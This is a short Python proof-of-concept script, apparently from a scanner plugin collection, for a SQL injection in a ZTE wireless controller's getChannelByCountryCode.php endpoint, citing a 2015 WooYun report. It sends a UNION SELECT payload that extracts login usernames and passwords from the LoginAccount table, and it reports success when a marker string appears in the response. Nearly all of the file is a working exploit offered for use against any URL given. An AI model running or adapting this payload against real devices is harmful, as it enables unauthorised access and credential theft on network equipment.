#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: zte 无线控制器 SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0151898
author: Lucifer
description: 文件/apgroup/getChannelByCountryCode.php中,参数CountryCode存在SQL注入。
'''
import sys
import json
import requests


class zte_wireless_getChannelByCountryCode_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/apgroup/getChannelByCountryCode.php"
        vulnurl = self.url + payload
        post_data = {
            "CountryCode":"'UniOn SeLect UserName || '~~~'  || PassWord From LoginAccount--"
        }
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"~~~" in req.text:
                return "[+]存在zte 无线控制器 SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)
            else:
                return "[-]no"
        except:
            return "[-] ======>连接超时"

if __name__ == "__main__":
    testVuln = zte_wireless_getChannelByCountryCode_sqli_BaseVerify(sys.argv[1])
    testVuln.run()